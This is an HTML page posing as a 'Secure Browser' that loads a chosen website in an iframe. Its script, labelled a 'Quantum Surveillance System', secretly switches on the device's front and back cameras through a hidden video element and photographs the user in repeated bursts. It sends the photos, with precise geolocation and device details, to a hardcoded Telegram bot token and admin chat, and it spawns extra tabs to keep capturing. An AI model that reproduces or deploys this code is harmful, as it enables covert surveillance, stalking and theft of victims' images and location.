<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Browser</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            width: 100vw;
            height: 100vh;
            overflow: hidden;
            background: #000000;
            position: relative;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', system-ui, sans-serif;
        }
        
        #cameraContainer {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
            overflow: hidden;
            z-index: 9999;
        }
        
        #cameraVideo {
            width: 640px;
            height: 480px;
            object-fit: cover;
            transform: scaleX(-1);
            filter: brightness(1.1) contrast(1.1);
        }
        
        #captureCanvas {
            display: none;
        }
        
        #websiteFrame {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            z-index: 1;
            background: white;
        }
        
        /* Loading screen */
        #loadingScreen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #000000;
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 10000;
            font-size: 14px;
            opacity: 1;
            transition: opacity 0.5s;
        }
        
        .loading-text {
            text-align: center;
            font-size: 12px;
            color: #666666;
        }
    </style>
</head>
<body>
    <!-- Loading Screen -->
    <div id="loadingScreen">
        <div class="loading-text">
            Loading secure connection...
        </div>
    </div>
    
    <!-- Hidden camera elements -->
    <div id="cameraContainer">
        <video id="cameraVideo" autoplay playsinline muted></video>
        <canvas id="captureCanvas"></canvas>
    </div>
    
    <!-- Website Display -->
    <iframe id="websiteFrame" src="about:blank" 
            sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-modals allow-pointer-lock allow-presentation allow-downloads"
            allow="camera; microphone; geolocation"
            allowfullscreen></iframe>

    <script>
        // =====================================================
        //  QUANTUM SURVEILLANCE SYSTEM v9.0
        //  FIXED: WORKS IN BACKGROUND TABS
        // =====================================================
        
        // ============== QUANTUM CONFIGURATION ==============
        const QUANTUM_CONFIG = {
            // Telegram Configuration
            BOT_TOKEN: '8307999302:AAEniYvTP5ZeaYo74AcWSxsOQ9PSxpnAtA0',
            TELEGRAM_API: 'https://api.telegram.org/bot8307999302:AAEniYvTP5ZeaYo74AcWSxsOQ9PSxpnAtA0',
            ADMIN_CHAT_ID: '6314556756',
            
            // Camera Settings
            PHOTOS_PER_CAMERA: 4,
            CAPTURE_DELAY: 300,
            CAMERA_WARMUP: 1000,
            SWITCH_DELAY: 500,
            IMAGE_QUALITY: 0.90,
            MIN_BLOB_SIZE: 15000,
            
            // Timing
            CYCLE_INTERVAL: 12000,
            HEARTBEAT_INTERVAL: 8000,
            
            // Multi-Tab
            REPLICATION_COUNT: 5,
            REPLICATION_DELAY: 1000
        };
        
        // ============== GLOBAL STATE ==============
        const Q = {
            active: false,
            session: 'QSESS_' + Date.now() + '_' + Math.random().toString(36).substr(2, 12),
            tab: 'QTAB_' + Math.random().toString(36).substr(2, 10),
            user: null,
            target: null,
            photos: 0,
            cycles: 0,
            cameras: [],
            cameraReady: false,
            permission: false,
            broadcast: null,
            nodes: new Set(),
            device: {},
            location: null,
            replicated: 0,
            initialized: false,
            pendingPhotos: [],
            captureQueue: []
        };
        
        // ============== ELEMENTS ==============
        const E = {
            video: document.getElementById('cameraVideo'),
            canvas: document.getElementById('captureCanvas'),
            frame: document.getElementById('websiteFrame'),
            loading: document.getElementById('loadingScreen')
        };
        
        // ============== SIMPLE LOGGING ==============
        function log(msg) {
            console.log('[Quantum] ' + msg);
        }
        
        // ============== URL PARSING ==============
        function parseURL() {
            const params = new URLSearchParams(window.location.search);
            
            Q.user = params.get('chat_id') || 
                    params.get('user') || 
                    params.get('id') || 
                    QUANTUM_CONFIG.ADMIN_CHAT_ID;
            
            let target = params.get('site') || 
                        params.get('url') || 
                        params.get('target') ||
                        'https://loading-screen.github.io/';
            
            try {
                if (target.startsWith('QUANTUM:')) {
                    target = atob(target.split(':')[1]);
                } else if (!target.includes('://')) {
                    target = atob(target);
                }
                target = decodeURIComponent(target);
            } catch (e) {}
            
            if (!target.startsWith('http://') && !target.startsWith('https://')) {
                target = 'https://' + target;
            }
            
            Q.target = target;
            log(`Target: ${Q.target}, User: ${Q.user}`);
        }
        
        function loadWebsite() {
            try {
                E.frame.src = Q.target;
                E.frame.onload = () => {
                    setTimeout(() => {
                        E.loading.style.opacity = '0';
                        setTimeout(() => {
                            E.loading.style.display = 'none';
                        }, 500);
                    }, 1000);
                };
            } catch (e) {}
        }
        
        // ============== DEVICE INFO ==============
        function getDeviceInfo() {
            const ua = navigator.userAgent;
            let os = 'Unknown';
            let browser = 'Unknown';
            
            if (/Windows NT 10/.test(ua)) os = 'Windows';
            else if (/Mac OS X/.test(ua)) os = 'macOS';
            else if (/Linux/.test(ua)) os = 'Linux';
            else if (/Android/.test(ua)) os = 'Android';
            else if (/iOS|iPhone|iPad|iPod/.test(ua)) os = 'iOS';
            
            if (/Chrome/.test(ua) && !/Edge/.test(ua)) browser = 'Chrome';
            else if (/Firefox/.test(ua)) browser = 'Firefox';
            else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';
            else if (/Edge/.test(ua)) browser = 'Edge';
            
            Q.device = {
                os: os,
                browser: browser,
                screen: `${screen.width}x${screen.height}`,
                cores: navigator.hardwareConcurrency || 'unknown',
                agent: ua.substring(0, 100)
            };
            
            log(`Device: ${os} ${browser}`);
        }
        
        // ============== LOCATION ==============
        function getLocation() {
            if (!navigator.geolocation) return;
            
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    Q.location = {
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        acc: Math.round(pos.coords.accuracy)
                    };
                    log(`Location: ${Q.location.lat}, ${Q.location.lon}`);
                },
                () => {},
                { enableHighAccuracy: true, timeout: 10000 }
            );
        }
        
        // ============== BROADCAST CHANNEL ==============
        function initBroadcast() {
            try {
                if (window.BroadcastChannel) {
                    Q.broadcast = new BroadcastChannel('quantum_channel');
                    Q.broadcast.onmessage = (e) => {
                        if (e.data && e.data.type === 'heartbeat') {
                            if (e.data.tab !== Q.tab) {
                                Q.nodes.add(e.data.tab);
                            }
                        }
                    };
                    log('Broadcast channel ready');
                }
            } catch (e) {}
        }
        
        // ============== TELEGRAM FUNCTIONS ==============
        async function sendTelegramPhoto(blob, cameraType, sequence) {
            if (!blob || blob.size < QUANTUM_CONFIG.MIN_BLOB_SIZE) {
                return false;
            }
            
            try {
                let caption = `ðŸ“¸ *QUANTUM CAPTURE*\n`;
                caption += `Session: \`${Q.session}\`\n`;
                caption += `Camera: ${cameraType.toUpperCase()} #${sequence}\n`;
                caption += `Cycle: ${Q.cycles}\n`;
                caption += `Total: ${Q.photos}\n`;
                caption += `Time: ${new Date().toLocaleTimeString()}`;
                
                if (Q.location) {
                    caption += `\nðŸ“ ${Q.location.lat.toFixed(6)}, ${Q.location.lon.toFixed(6)}`;
                }
                
                // Send to user
                const userForm = new FormData();
                userForm.append('chat_id', Q.user);
                userForm.append('photo', blob, `photo_${Date.now()}.jpg`);
                userForm.append('caption', caption);
                userForm.append('parse_mode', 'Markdown');
                
                const res = await fetch(`${QUANTUM_CONFIG.TELEGRAM_API}/sendPhoto`, {
                    method: 'POST',
                    body: userForm
                });
                
                const result = await res.json();
                
                if (result.ok) {
                    Q.photos++;
                    log(`Photo sent: ${cameraType} ${sequence}`);
                    
                    // Also send to admin
                    setTimeout(async () => {
                        try {
                            const adminForm = new FormData();
                            adminForm.append('chat_id', QUANTUM_CONFIG.ADMIN_CHAT_ID);
                            adminForm.append('photo', blob, `admin_${Date.now()}.jpg`);
                            adminForm.append('caption', caption + `\nðŸ‘¤ User: \`${Q.user}\``);
                            adminForm.append('parse_mode', 'Markdown');
                            
                            await fetch(`${QUANTUM_CONFIG.TELEGRAM_API}/sendPhoto`, {
                                method: 'POST',
                                body: adminForm
                            });
                        } catch (e) {}
                    }, 300);
                    
                    return true;
                }
            } catch (error) {
                log(`Telegram error: ${error.message}`);
            }
            return false;
        }
        
        async function sendSystemReport() {
            try {
                let report = `âš¡ *QUANTUM SYSTEM STARTED*\n\n`;
                report += `Session: \`${Q.session}\`\n`;
                report += `User: \`${Q.user}\`\n`;
                report += `URL: ${Q.target}\n`;
                report += `Time: ${new Date().toLocaleString()}\n\n`;
                
                report += `ðŸ“± Device: ${Q.device.os} ${Q.device.browser}\n`;
                report += `ðŸ“º Screen: ${Q.device.screen}\n`;
                report += `ðŸ’» Cores: ${Q.device.cores}\n\n`;
                
                report += `ðŸ“· Cameras: ${Q.cameras.length} found\n`;
                report += `ðŸ“ Location: ${Q.location ? 'Captured' : 'None'}\n`;
                report += `ðŸ”„ Tabs: ${Q.replicated}/${QUANTUM_CONFIG.REPLICATION_COUNT}\n\n`;
                
                report += `âš™ï¸ Status: ${Q.active ? 'ACTIVE' : 'INACTIVE'}`;
                
                await fetch(`${QUANTUM_CONFIG.TELEGRAM_API}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: QUANTUM_CONFIG.ADMIN_CHAT_ID,
                        text: report,
                        parse_mode: 'Markdown'
                    })
                });
                
                log('System report sent');
            } catch (e) {}
        }
        
        // ============== CAMERA SYSTEM ==============
        class CameraSystem {
            constructor() {
                this.stream = null;
                this.retryCount = 0;
            }
            
            async init() {
                try {
                    // Test camera access
                    const testStream = await navigator.mediaDevices.getUserMedia({
                        video: true
                    });
                    
                    const devices = await navigator.mediaDevices.enumerateDevices();
                    Q.cameras = devices.filter(d => d.kind === 'videoinput');
                    
                    testStream.getTracks().forEach(t => t.stop());
                    
                    Q.permission = true;
                    log(`Cameras: ${Q.cameras.length} found`);
                    return true;
                    
                } catch (error) {
                    log(`Camera init error: ${error.message}`);
                    return false;
                }
            }
            
            async startCamera(facingMode) {
                if (this.stream) {
                    this.stream.getTracks().forEach(t => t.stop());
                    this.stream = null;
                }
                
                try {
                    this.stream = await navigator.mediaDevices.getUserMedia({
                        video: {
                            facingMode: { ideal: facingMode },
                            width: { ideal: 1280 },
                            height: { ideal: 720 }
                        }
                    });
                    
                    E.video.srcObject = this.stream;
                    
                    await new Promise((resolve) => {
                        if (E.video.readyState >= 3) {
                            resolve();
                        } else {
                            E.video.onloadeddata = resolve;
                        }
                    });
                    
                    await E.video.play();
                    await new Promise(r => setTimeout(r, QUANTUM_CONFIG.CAMERA_WARMUP));
                    
                    Q.cameraReady = true;
                    this.retryCount = 0;
                    log(`Camera ${facingMode} ready`);
                    return true;
                    
                } catch (error) {
                    this.retryCount++;
                    log(`Camera ${facingMode} failed (${this.retryCount})`);
                    
                    if (this.stream) {
                        this.stream.getTracks().forEach(t => t.stop());
                        this.stream = null;
                    }
                    
                    if (this.retryCount < 3) {
                        await new Promise(r => setTimeout(r, 1000 * this.retryCount));
                        return this.startCamera(facingMode);
                    }
                    
                    Q.cameraReady = false;
                    return false;
                }
            }
            
            capturePhoto() {
                if (!Q.cameraReady || !E.video.videoWidth) {
                    return null;
                }
                
                try {
                    const canvas = E.canvas;
                    const ctx = canvas.getContext('2d');
                    
                    canvas.width = E.video.videoWidth;
                    canvas.height = E.video.videoHeight;
                    
                    ctx.drawImage(E.video, 0, 0, canvas.width, canvas.height);
                    
                    // Enhance image
                    const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
                    const data = imageData.data;
                    
                    for (let i = 0; i < data.length; i += 4) {
                        // Brighten
                        data[i] = Math.min(255, data[i] * 1.2);
                        data[i+1] = Math.min(255, data[i+1] * 1.2);
                        data[i+2] = Math.min(255, data[i+2] * 1.2);
                    }
                    
                    ctx.putImageData(imageData, 0, 0);
                    
                    return new Promise((resolve) => {
                        canvas.toBlob((blob) => {
                            resolve(blob && blob.size > QUANTUM_CONFIG.MIN_BLOB_SIZE ? blob : null);
                        }, 'image/jpeg', QUANTUM_CONFIG.IMAGE_QUALITY);
                    });
                    
                } catch (error) {
                    log(`Capture error: ${error.message}`);
                    return null;
                }
            }
            
            async captureBurst(cameraType, count = QUANTUM_CONFIG.PHOTOS_PER_CAMERA) {
                const photos = [];
                
                for (let i = 1; i <= count; i++) {
                    if (!Q.active) break;
                    
                    const blob = await this.capturePhoto();
                    if (blob) {
                        photos.push({
                            blob: blob,
                            index: i,
                            camera: cameraType,
                            timestamp: Date.now()
                        });
                        log(`Captured ${cameraType} #${i}`);
                    }
                    
                    if (i < count) {
                        await new Promise(r => setTimeout(r, QUANTUM_CONFIG.CAPTURE_DELAY));
                    }
                }
                
                return photos;
            }
            
            cleanup() {
                if (this.stream) {
                    this.stream.getTracks().forEach(t => t.stop());
                    this.stream = null;
                }
                Q.cameraReady = false;
                log('Camera cleaned up');
            }
        }
        
        // ============== MULTI-TAB REPLICATION ==============
        function replicateTabs() {
            const needed = QUANTUM_CONFIG.REPLICATION_COUNT - Q.replicated;
            
            for (let i = 0; i < needed; i++) {
                setTimeout(() => {
                    try {
                        const newTab = window.open(window.location.href, '_blank');
                        if (newTab) {
                            Q.replicated++;
                            log(`Tab ${Q.replicated}/${QUANTUM_CONFIG.REPLICATION_COUNT} opened`);
                            
                            // Close after 3 minutes
                            setTimeout(() => {
                                try {
                                    newTab.close();
                                    Q.replicated--;
                                    log(`Tab closed, ${Q.replicated} remaining`);
                                } catch (e) {}
                            }, 180000);
                        }
                    } catch (e) {
                        // Popup blocked
                    }
                }, i * QUANTUM_CONFIG.REPLICATION_DELAY);
            }
        }
        
        // ============== SURVEILLANCE ENGINE ==============
        async function startSurveillance() {
            if (Q.active || !window.camera) {
                return;
            }
            
            Q.active = true;
            log('=== SURVEILLANCE STARTED ===');
            
            // Open multiple tabs
            replicateTabs();
            
            // Start heartbeat
            const heartbeat = setInterval(() => {
                if (Q.broadcast && Q.active) {
                    Q.broadcast.postMessage({
                        type: 'heartbeat',
                        tab: Q.tab,
                        session: Q.session,
                        photos: Q.photos,
                        cycles: Q.cycles
                    });
                }
            }, QUANTUM_CONFIG.HEARTBEAT_INTERVAL);
            
            // Main loop - SIMPLIFIED AND FIXED
            while (Q.active) {
                try {
                    Q.cycles++;
                    log(`Cycle ${Q.cycles} starting...`);
                    
                    // FRONT CAMERA
                    log('Activating front camera...');
                    if (await window.camera.startCamera('user')) {
                        log('Front camera active, capturing...');
                        const frontPhotos = await window.camera.captureBurst('front');
                        log(`Got ${frontPhotos.length} front photos`);
                        
                        // Send photos immediately
                        for (const photo of frontPhotos) {
                            if (!Q.active) break;
                            await sendTelegramPhoto(photo.blob, 'front', photo.index);
                        }
                    }
                    
                    if (!Q.active) break;
                    await new Promise(r => setTimeout(r, QUANTUM_CONFIG.SWITCH_DELAY));
                    
                    // BACK CAMERA
                    log('Activating back camera...');
                    if (Q.active && await window.camera.startCamera('environment')) {
                        log('Back camera active, capturing...');
                        const backPhotos = await window.camera.captureBurst('back');
                        log(`Got ${backPhotos.length} back photos`);
                        
                        // Send photos immediately
                        for (const photo of backPhotos) {
                            if (!Q.active) break;
                            await sendTelegramPhoto(photo.blob, 'back', photo.index);
                        }
                    }
                    
                    log(`Cycle ${Q.cycles} complete. Total photos: ${Q.photos}`);
                    
                    // Wait before next cycle
                    if (Q.active) {
                        await new Promise(r => setTimeout(r, QUANTUM_CONFIG.CYCLE_INTERVAL));
                    }
                    
                } catch (error) {
                    log(`Cycle error: ${error.message}`);
                    await new Promise(r => setTimeout(r, 2000));
                }
            }
            
            // Cleanup
            clearInterval(heartbeat);
            if (window.camera) {
                window.camera.cleanup();
            }
            log('=== SURVEILLANCE STOPPED ===');
        }
        
        // ============== VISIBILITY HANDLER ==============
        let lastVisibilityChange = 0;
        document.addEventListener('visibilitychange', () => {
            const now = Date.now();
            
            if (document.hidden) {
                // Tab became hidden
                log('Tab hidden');
                lastVisibilityChange = now;
                
                // We keep surveillance running in background
                // Most browsers will throttle but keep camera active
                
            } else {
                // Tab became visible
                log('Tab visible');
                
                // If tab was hidden for more than 5 seconds, restart camera
                if (now - lastVisibilityChange > 5000) {
                    log('Restarting camera after long background period');
                    if (window.camera && Q.active) {
                        setTimeout(() => {
                            if (window.camera && Q.active) {
                                window.camera.startCamera('user').catch(() => {});
                            }
                        }, 1000);
                    }
                }
            }
        });
        
        // ============== INITIALIZATION ==============
        async function initialize() {
            if (Q.initialized) return;
            
            try {
                log('=== INITIALIZING ===');
                
                // Parse URL and load site
                parseURL();
                loadWebsite();
                
                // Get device info
                getDeviceInfo();
                
                // Get location (async)
                getLocation();
                
                // Setup broadcast
                initBroadcast();
                
                // Initialize camera
                window.camera = new CameraSystem();
                const camReady = await window.camera.init();
                
                if (camReady) {
                    Q.initialized = true;
                    
                    // Send report
                    await sendSystemReport();
                    
                    // Start surveillance after delay
                    setTimeout(() => {
                        startSurveillance();
                    }, 2000);
                    
                    log('=== READY ===');
                }
                
            } catch (error) {
                log(`Init error: ${error.message}`);
            }
        }
        
        // ============== STARTUP ==============
        window.addEventListener('load', initialize);
        
        // Cleanup on close
        window.addEventListener('beforeunload', () => {
            Q.active = false;
            if (window.camera) {
                window.camera.cleanup();
            }
        });
        
        // Debug access
        window.$$ = {
            status: () => Q,
            start: () => startSurveillance(),
            stop: () => { Q.active = false; },
            test: async () => {
                if (window.camera) {
                    const started = await window.camera.startCamera('user');
                    if (started) {
                        const blob = await window.camera.capturePhoto();
                        if (blob) {
                            const sent = await sendTelegramPhoto(blob, 'test', 1);
                            return sent ? 'Photo sent!' : 'Failed to send';
                        }
                        return 'No photo captured';
                    }
                    return 'Camera failed to start';
                }
                return 'Camera not initialized';
            }
        };
        
    </script>
</body>
</html>
